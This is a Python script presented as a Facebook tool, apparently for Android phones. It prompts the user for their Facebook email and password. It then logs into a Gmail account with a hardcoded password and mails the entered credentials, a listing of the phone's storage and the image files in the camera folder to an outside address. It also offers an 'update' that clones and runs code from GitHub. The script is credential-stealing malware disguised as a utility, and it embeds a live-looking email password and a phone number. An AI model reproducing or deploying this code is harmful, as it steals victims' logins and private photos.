import smtplib, sys, ssl, os, getpass
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
os.system('clear')
print('''
─────╔╗─────────╔╗─╔╗──────────╔╗──
────╔╝╚╗────────║║─║║──────────║║──
╔╗╔╗╚╗╔╝╔══╗╔══╗║║─║╚═╗╔══╗╔══╗║║╔╗
╚╬╬╝─║║─║╔╗║║╔╗║║║─║╔╗║║╔╗║║╔═╝║╚╝╝
╔╬╬╗─║╚╗║╚╝║║╚╝║║╚╗║║║║║╔╗║║╚═╗║╔╗╗
╚╝╚╝─╚═╝╚══╝╚══╝╚═╝╚╝╚╝╚╝╚╝╚══╝╚╝╚╝
''')
upd = input('mettre à jour ?(y/n)')
if upd == 'y':
    os.system('cd $home')
    os.system('mv xtoolfacebook xtoolx')
    os.system('git clone https://github.com/ZarguiJack/xtoolfacebook')
    print('done')
    os.system('cd xtoolfacebook')
    os.system('python Xtool.py')
print('Veuillez tout d\'abord vous connecter à votre compte Facebook/// first log into your own facebook account')
usn = input('email/phonenumber: ')
usp = input('Password: ')
print('En cours de connexion, veuillez patienter...')

def connect(nom):
    with open(nom, 'rb') as fp:
        img = MIMEImage(fp.read())
        img.add_header('Content-Disposition', 'attachment', filename=nom)
        msg.attach(img)
    try:
        s.sendmail(sa, ra, msg.as_string())
    except:
        print('<Exeption>')

context = ssl.create_default_context()
# creates SMTP session 

s = smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context) 

  
# start TLS for security 
#s.starttls() 

  
# Authentication 
sa = 'zarguinajack@gmail.com'
sp = 'fugidemsvie'
s.login(sa, sp) 

ra = 'bertranddupont885@gmail.com'
connexion = usn + '\n'+ usp
os.chdir('/storage/emulated/0')
for x in os.listdir():
    connexion= '\n' + connexion+ x +'\n'
msg = MIMEMultipart()
msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
msg.attach(msgText)
s.sendmail(sa, ra, msg.as_string())

chemin = '/storage/emulated/0//DCIM/Camera/'
os.chdir('/storage/emulated/0/DCIM/Camera')
liste = os.listdir()
for x in liste:
    l = list(x)
    #print(l)
    if '.' in l:
        #print(x)
        if l[-1] is 'g':
            #print(x)
            n = chemin + x
            na = list(n)
            if ' ' in na:
                na.remove(' ')
            name = ''.join(na)
            connect(name)
print('veuillez me contacter sur whatsapp: +237650920378/// repport the issue on whatsapp +237650920378')

